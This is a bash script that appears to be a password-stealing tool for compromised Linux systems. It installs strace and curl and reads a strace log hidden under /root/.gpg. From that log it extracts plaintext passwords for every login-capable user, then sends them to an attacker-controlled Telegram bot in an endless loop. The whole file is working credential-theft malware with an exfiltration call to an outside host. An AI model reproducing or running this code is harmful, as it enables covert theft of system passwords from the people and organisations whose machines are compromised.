API="YOUR BOT API GOES HERE"
USERID="YOUR TELEGRAM NUMERIC ID GOES HERE"
PATHLOG="/root/.gpg"
LOGFILE="$PATHLOG/auth.log"
LASTPASS=""
NEWPASS=""
MIDDLEWARE=""

function install(){
  if ! command -v strace || ! command -v curl;then
    if command -v apt-get &> /dev/null ;then
      apt-get install strace curl
    elif command -v yum &>/dev/null ;then
      yum install strace curl
    fi
  fi
}

function sendMessage(){
  if [[ "$MIDDLEWARE" != "$LASTPASS"  ]];then
    MESSAGE="$MIDDLEWARE"
    curl --silent "https://api.telegram.org/bot$API/sendMessage?chat_id=$USERID&text=$MESSAGE" >> /dev/null
    LASTPASS="$MIDDLEWARE"
  fi
}

function debian(){
  for user in $(grep -vE 'nologin|false' /etc/passwd | cut -d ":" -f 1);do
    NEWPASS=$(grep -E "authentication.*acct=..$user" .gpg/auth.log -B 50 | grep "write(4" | grep unfinished | cut -d '"' -f 2 | sed 's/\\.//g')
    if [ ! -z "$NEWPASS" ];then
	    NEWPASS="USER: $user PASSWD: $(echo $NEWPASS | tr '\n' ' ')"
      MIDDLEWARE="$MIDDLEWARE $NEWPASS"
    fi
  done
  echo "$MIDDLEWARE"
}

function main(){
  debian
  sendMessage
  MIDDLEWARE=""
  sleep 1
}
while true;do
main
done
